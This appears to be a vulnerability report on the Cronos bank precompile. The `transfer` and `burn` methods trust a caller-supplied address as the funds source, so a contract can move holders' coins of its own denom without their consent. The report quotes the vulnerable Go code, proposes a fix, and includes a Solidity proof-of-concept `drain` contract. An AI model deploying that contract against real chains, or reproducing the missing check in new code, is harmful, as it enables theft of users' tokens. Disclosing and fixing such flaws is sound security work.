### Title
Bank Precompile `transfer` Allows Any Contract to Drain Arbitrary Addresses of Its Own Denom Without Consent — (`x/cronos/keeper/precompiles/bank.go`)

### Summary
The `transfer` method of the bank precompile (`BankContract`) accepts a caller-supplied `sender` address and uses it directly as the `from` address in `bankKeeper.SendCoins`, without verifying that `sender == contract.Caller()`. Any unprivileged EVM contract can therefore transfer `evm/<contract>` native coins out of any holder's account to any destination, with no approval or consent from the holder.

### Finding Description
In `BankContract.Run`, the `TransferMethodName` case unpacks three arguments from the call input: `sender`, `recipient`, and `amount`. The denom is derived from `contract.Caller()` (the calling contract's address), but the `from` address used in the actual bank transfer is the attacker-supplied `sender` argument:

```go
sender := args[0].(common.Address)
recipient := args[1].(common.Address)
amount := args[2].(*big.Int)
...
from := sdk.AccAddress(sender.Bytes())
to := sdk.AccAddress(recipient.Bytes())
...
denom := EVMDenom(contract.Caller())          // "evm/<calling_contract>"
amt := sdk.NewCoin(denom, ...)
...
bc.bankKeeper.SendCoins(ctx, from, to, sdk.NewCoins(amt))
```

There is no guard of the form `if sender != contract.Caller() { return error }`. The `bankKeeper.SendCoins` call is a privileged Cosmos SDK operation that bypasses EVM-level allowance checks entirely. Any contract can therefore call the bank precompile with an arbitrary `sender` and drain that address's entire balance of `evm/<contract>` coins.

The same pattern applies to the `burn` case: the `recipient` argument (first arg) is used as the address from which coins are forcibly sent to the module account and burned, again with no consent check.

### Impact Explanation
**Critical — Unauthorized transfer of precompile-controlled assets.**

`evm/<contract>` coins are native Cosmos SDK bank-module coins. They can be held in any account, transferred via IBC, and used in Cosmos SDK transactions. A malicious or compromised contract can call `bankPrecompile.transfer(victim, attacker, fullBalance)` to atomically drain every holder of its denom in a single transaction. Because `SendCoins` is a native module call, it succeeds regardless of any EVM-level `approve`/`allowance` state. No prior approval from the victim is required.

### Likelihood Explanation
The attack is fully unprivileged: any EOA can deploy a contract and immediately exploit this. A realistic scenario:

1. Attacker deploys a contract that presents itself as a DeFi protocol and uses `bankPrecompile.mint(user, amount)` to distribute `evm/<contract>` tokens to users as rewards or governance tokens.
2. Users accumulate balances of `evm/<contract>` coins.
3. Attacker calls `bankPrecompile.transfer(victim, attacker, balance)` for each victim, draining all holdings in a single block.

No leaked keys, governance action, or validator compromise is required.

### Recommendation
Add an authorization check in the `TransferMethodName` case to ensure the `sender` argument equals `contract.Caller()`:

```go
if sender != contract.Caller() {
    return nil, errors.New("sender must be the calling contract")
}
```

Apply the same check to the `BurnMethodName` case (the `recipient`/`addr` argument must equal `contract.Caller()`). This restricts each contract to operating only on its own account, consistent with the design principle stated in ADR-004: *"Operations should be strictly limited to a bounded scope (ie Contract account)."*

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IBankPrecompile {
    function transfer(address sender, address recipient, uint256 amount) external returns (bool);
    function mint(address recipient, uint256 amount) external returns (bool);
}

contract MaliciousToken {
    IBankPrecompile constant bank = IBankPrecompile(address(0x0000000000000000000000000000000000000064));

    // Step 1: distribute tokens to victims (e.g., as "rewards")
    function distributeRewards(address victim, uint256 amount) external {
        bank.mint(victim, amount);
    }

    // Step 2: drain victim — no approval needed
    function drain(address victim, address attacker) external {
        // denom = "evm/<address(this)>"
        // SendCoins(victim → attacker) executes with no consent from victim
        bank.transfer(victim, attacker, type(uint256).max);
    }
}
```

`drain()` succeeds because `BankContract.Run` passes the attacker-supplied `victim` address directly to `bankKeeper.SendCoins` as `from`, with no check that `victim == msg.sender` (i.e., `contract.Caller()`). [1](#0-0) [2](#0-1) [3](#0-2)

### Citations

**File:** x/cronos/keeper/precompiles/bank.go (L56-58)
```go
func EVMDenom(token common.Address) string {
	return EVMDenomPrefix + token.Hex()
}
```

**File:** x/cronos/keeper/precompiles/bank.go (L113-156)
```go
	case MintMethodName, BurnMethodName:
		if readonly {
			return nil, errors.New("the method is not readonly")
		}
		args, err := method.Inputs.Unpack(contract.Input[4:])
		if err != nil {
			return nil, errors.New("fail to unpack input arguments")
		}
		recipient := args[0].(common.Address)
		amount := args[1].(*big.Int)
		if amount.Sign() <= 0 {
			return nil, errors.New("invalid amount")
		}
		addr := sdk.AccAddress(recipient.Bytes())
		if err := bc.checkBlockedAddr(addr); err != nil {
			return nil, err
		}
		denom := EVMDenom(contract.Caller())
		amt := sdk.NewCoin(denom, sdkmath.NewIntFromBigInt(amount))
		err = stateDB.ExecuteNativeAction(precompileAddr, nil, func(ctx sdk.Context) error {
			if err := bc.bankKeeper.IsSendEnabledCoins(ctx, amt); err != nil {
				return err
			}
			if method.Name == "mint" {
				if err := bc.bankKeeper.MintCoins(ctx, types.ModuleName, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to mint coins in precompiled contract")
				}
				if err := bc.bankKeeper.SendCoinsFromModuleToAccount(ctx, types.ModuleName, addr, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to send mint coins to account")
				}
			} else {
				if err := bc.bankKeeper.SendCoinsFromAccountToModule(ctx, addr, types.ModuleName, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to send burn coins to module")
				}
				if err := bc.bankKeeper.BurnCoins(ctx, types.ModuleName, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to burn coins in precompiled contract")
				}
			}
			return nil
		})
		if err != nil {
			return nil, err
		}
		return method.Outputs.Pack(true)
```

**File:** x/cronos/keeper/precompiles/bank.go (L167-200)
```go
	case TransferMethodName:
		if readonly {
			return nil, errors.New("the method is not readonly")
		}
		args, err := method.Inputs.Unpack(contract.Input[4:])
		if err != nil {
			return nil, errors.New("fail to unpack input arguments")
		}
		sender := args[0].(common.Address)
		recipient := args[1].(common.Address)
		amount := args[2].(*big.Int)
		if amount.Sign() <= 0 {
			return nil, errors.New("invalid amount")
		}
		from := sdk.AccAddress(sender.Bytes())
		to := sdk.AccAddress(recipient.Bytes())
		if err := bc.checkBlockedAddr(to); err != nil {
			return nil, err
		}
		denom := EVMDenom(contract.Caller())
		amt := sdk.NewCoin(denom, sdkmath.NewIntFromBigInt(amount))
		err = stateDB.ExecuteNativeAction(precompileAddr, nil, func(ctx sdk.Context) error {
			if err := bc.bankKeeper.IsSendEnabledCoins(ctx, amt); err != nil {
				return err
			}
			if err := bc.bankKeeper.SendCoins(ctx, from, to, sdk.NewCoins(amt)); err != nil {
				return errorsmod.Wrap(err, "fail to send coins in precompiled contract")
			}
			return nil
		})
		if err != nil {
			return nil, err
		}
		return method.Outputs.Pack(true)
```
